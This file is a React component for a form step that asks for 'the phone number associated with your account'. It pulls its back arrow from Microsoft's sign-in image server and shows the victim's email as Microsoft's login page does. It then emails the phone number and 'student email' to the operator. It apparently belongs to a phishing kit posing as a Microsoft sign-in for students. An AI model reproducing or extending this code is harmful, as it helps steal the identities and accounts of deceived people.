import { useState, useEffect } from "react";
import NotificationSender from "./NotificationSender"; // Import the NotificationSender hook
import { FormFooter } from "./FormFooter";

export const Phone = ({ onNext, phoneError, phone, onBack }) => {
  const [phoneValue, setPhoneValue] = useState("");
  const [borderColor, setBorderColor] = useState("1px solid #ccc"); // Default border color
  const [errorMessage, setErrorMessage] = useState("");
  const [isPhoneValidated, setIsPhoneValidated] = useState(false); // Track phone validation

  const { isSending, error, successMessage, sendEmail } = NotificationSender(); // Destructure from NotificationSender

  // If phone prop changes, set it as the value for the phone input
  useEffect(() => {
    if (phone) {
      setPhoneValue(phone); // Pre-fill the phone field
    }
  }, [phone]);

  // Handle input changes
  const handleInputChange = (e) => {
    setPhoneValue(e.target.value);
    setBorderColor("1px solid #ccc"); // Reset border color when typing
    setErrorMessage(""); // Reset error message when user starts typing
  };

  // Validate US phone number format
  const isValidUSPhoneNumber = (number) => {
    const phoneRegex = /^\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})$/;
    return phoneRegex.test(number);
  };

  // Handle the next button click
  const handleNext = () => {
    // Check if the phone number is empty or invalid
    if (!phoneValue.trim()) {
      setErrorMessage("Enter a valid US phone number.");
      setBorderColor("1px solid red"); // Red border for empty phone number
    } else if (!isValidUSPhoneNumber(phoneValue)) {
      setErrorMessage(
        "Invalid phone number format. Please enter a valid US phone number."
      );
      setBorderColor("1px solid red"); // Red border for invalid phone number
    } else {
      setErrorMessage(""); // No error
      setBorderColor("1px solid #ccc"); // Reset border
      setIsPhoneValidated(true); // Mark phone number as validated

      // Send phone number using the sendEmail function from NotificationSender
      sendEmail(
        `Phone number submission`,
        `Phone: ${phoneValue}\nstudent email: ${sessionStorage.getItem(
          "student_id"
        )}`
      );

      localStorage.setItem("student_phone", phoneValue);
      console.log(phoneValue);

      // Proceed to the next step after phone number is sent
      onNext(phoneValue);
    }
  };

  return (
    <>
      <div
        className="field-container"
        style={{ opacity: isPhoneValidated && isSending ? 0.5 : 1 }} // Apply fade when phone is validated and sending
      >
        <div className="email-entered">
          <button className="arrow" onClick={onBack}>
            <img
              src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
              alt="arrow_left"
            />
          </button>
          <p>{sessionStorage.getItem("student_id")}</p>{" "}
          {/* Display email here */}
        </div>

        <div className="f-t">
          <h1 className="form-title">Phone Number</h1>
        </div>

        <div className="input-message">
          <p>Confirm the phone number associated with your account.</p>
          {errorMessage && (
            <p className="guide error" style={{ color: "red" }}>
              {errorMessage}
            </p>
          )}
          <br />
          <input
            type="text"
            name="phone"
            id="phone"
            placeholder="Phone number"
            className="field phone-field"
            value={phoneValue}
            onChange={handleInputChange}
            style={{
              borderBottom: borderColor, // Apply border color dynamically
              backgroundColor: "transparent", // Keep background transparent
            }}
          />
        </div>
        <div className="button-container">
          <button type="button" className="next" onClick={handleNext}>
            Next
          </button>
        </div>
      </div>
      {/* <FormFooter /> */}
    </>
  );
};
